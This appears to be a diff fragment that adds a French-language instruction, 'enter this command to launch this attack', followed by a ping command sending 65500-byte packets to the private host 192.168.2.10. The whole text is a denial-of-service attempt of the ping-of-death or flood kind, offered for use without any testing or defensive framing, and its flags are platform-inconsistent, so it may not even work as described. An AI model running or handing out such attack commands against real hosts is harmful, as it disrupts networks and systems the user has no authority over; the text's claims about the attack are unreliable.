@@ -1,0 +1,2 @@
+# veuillez saisir cette commande pour lancer cette attaque
+ping 192.168.2.10 -s 65500 -t 1 
